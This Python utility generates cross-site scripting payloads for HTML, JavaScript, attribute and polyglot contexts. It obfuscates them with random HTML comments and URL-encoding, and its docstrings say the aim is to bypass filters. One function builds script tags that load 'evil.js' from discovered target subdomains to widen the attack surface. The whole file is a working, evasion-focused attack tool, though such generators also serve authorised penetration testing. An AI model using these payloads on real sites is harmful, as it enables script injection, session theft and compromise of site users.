# utilities/xss_payload_generator.py

import random
import string

def random_comments(text):
    """
    Inserts random HTML comment fragments within the given text.
    This technique can break up signature strings, bypassing strict filters.
    """
    result = ""
    for char in text:
        result += char
        # With 30% probability, inject a random comment fragment.
        if random.random() < 0.3:
            comment = "<!--{}-->".format(''.join(random.choices(string.ascii_letters, k=3)))
            result += comment
    return result

def generate_html_bypass_payloads():
    """
    Returns a list of payloads for the HTML context (e.g. a normal <script> tag)
    augmented with obfuscation techniques (via random comment insertion and encoding)
    to help bypass framework filters.
    """
    base_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert(1)>'
    ]
    payloads = []
    for payload in base_payloads:
        # Obfuscate by inserting random comments into key sections.
        obfus_payload = random_comments(payload)
        payloads.append(obfus_payload)
        # Also include a version that is URL-encoded.
        encoded_payload = payload.replace("<", "%3C").replace(">", "%3E")
        payloads.append(encoded_payload)
    return list(set(payloads))

def generate_js_bypass_payloads():
    """
    Returns a list of payloads intended for JavaScript context injections
    with extra random obfuscation.
    """
    base_payloads = [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "javascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="
    ]
    payloads = []
    for pl in base_payloads:
        payloads.append(pl)
        # Obfuscate the payload with random inserted HTML comments.
        payloads.append(random_comments(pl))
    return list(set(payloads))

def generate_attribute_bypass_payloads():
    """
    Returns payloads crafted for injection into HTML attributes,
    with obfuscation techniques to bypass filtering.
    """
    base_payloads = [
        '" onmouseover=alert(1)',
        "' onmouseover=alert(1)",
        '" onfocus=alert(1)',
        "' onfocus=alert(1)"
    ]
    payloads = []
    for pl in base_payloads:
        payloads.append(pl)
        payloads.append(random_comments(pl))
    return list(set(payloads))

def generate_polyglot_payloads():
    """
    Returns polyglot payloads, which are crafted to work across several contexts.
    """
    base_payloads = [
        'jaVasCript:/*-/*`/*\\\'/*"%0d%0a%0d%0a/**/(alert(1))/*/',
        "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>"
    ]
    payloads = []
    for pl in base_payloads:
        payloads.append(pl)
        payloads.append(random_comments(pl))
    return list(set(payloads))

def generate_subdomain_payloads(subdomains):
    """
    For each discovered subdomain, generate a payload that references an external script.
    This technique is useful if you have discovered additional target subdomains and want to
    increase the attack surface.
    
    Args:
        subdomains (list): A list of discovered subdomain strings.
    
    Returns:
        list: Payloads that load external resources from each subdomain.
    """
    payloads = []
    for sub in subdomains:
        # This payload attempts to load a script from the target subdomain.
        payload = f'<script src="http://{sub}/evil.js"></script>'
        payloads.append(payload)
        payloads.append(random_comments(payload))
    return list(set(payloads))

def generate_all_payloads(subdomains=None):
    """
    Combine and shuffle payloads from different contexts to generate a comprehensive list.
    Optionally, include payloads that reference discovered subdomains.
    
    Args:
        subdomains (list, optional): A list of discovered subdomains. If provided, payloads that
                                     reference these will be added.
                                     
    Returns:
        list: A shuffled list of unique XSS payloads.
    """
    payloads = []
    payloads.extend(generate_html_bypass_payloads())
    payloads.extend(generate_js_bypass_payloads())
    payloads.extend(generate_attribute_bypass_payloads())
    payloads.extend(generate_polyglot_payloads())
    
    if subdomains and isinstance(subdomains, list):
        payloads.extend(generate_subdomain_payloads(subdomains))
        
    random.shuffle(payloads)
    return payloads

if __name__ == "__main__":
    # For testing, you can pass a list of subdomains (e.g., discovered via your subdomain scanner)
    sample_subdomains = ["api.example.com", "dev.example.com"]
    payloads = generate_all_payloads(sample_subdomains)
    print("Generated XSS Payloads:")
    for p in payloads:
        print(p)
